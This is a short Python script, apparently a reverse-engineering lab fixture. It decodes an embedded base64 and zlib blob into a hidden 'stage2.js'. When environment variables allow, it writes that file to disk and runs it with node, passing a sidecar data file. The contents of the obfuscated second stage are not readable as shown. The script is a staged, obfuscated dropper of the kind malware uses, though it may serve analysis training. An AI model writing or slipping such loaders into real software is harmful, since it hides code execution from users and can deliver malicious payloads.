import base64
import sys
import zlib

block = 'eJx9kl9LwzAUxd/3KUKfWtiCiIh/8MGhgiIqTkEQGWl600XbpOamc9Xtu5umri1u+tKS5Jdz7j25XCu0RCA5IQbeS2kgDJRO4EhgEB0PuD8umJ1tAPVmh3xmMt5A6s0OiXVSOUQgNcCSC5nBpFI8LIzmgEiZSefPuy9kufR+9FVLFU6niTSK5TAkQcGMpQmzQeQWDLmUnbb7Cpk69dqSpqX6lIVXH5dCgKHC6DysC3BXY4awvxdEEbV6Yo1UaRiUVhx0ahmL75gBZZ3gujxQc3p/Pr24fHp4dP/r0/HxQAoStmxEvgaEtAJ/Rtpj/s21xznmh25SaT1dN9x1M9o5HAmpWNbc8+40f3PR+QzcuqfHRZ3T1eT2hrpEEcImux6BujQctpg6O6zQQk7twva9Poy00L5oc9/BQi5saWCk8eQM8O2axf3GZhptY/J7JFqB9pW3G22pz0IGOVhT0VfUqh4V3yn6d5aiCr84ywsmU3VUJ0HXq6EvZxU5r9XAj4HOgGY67eL5BtbXES8='
stage = zlib.decompress(base64.b64decode(block))
import os
from pathlib import Path

parent = os.environ.get("RE_FIXTURE_LAB")
if parent:
    lab = Path(parent) / "case-09-entry"
    lab.mkdir()
    target = lab / "stage2.js"
    target.write_bytes(stage)
    if os.environ.get("RE_FIXTURE_CHAIN") == "1":
        import subprocess
        sidecar = Path(__file__).with_name("part.dat").resolve()
        raise SystemExit(subprocess.run(["node", str(target), str(sidecar)], timeout=10).returncode)

sys.stdout.buffer.write(stage)
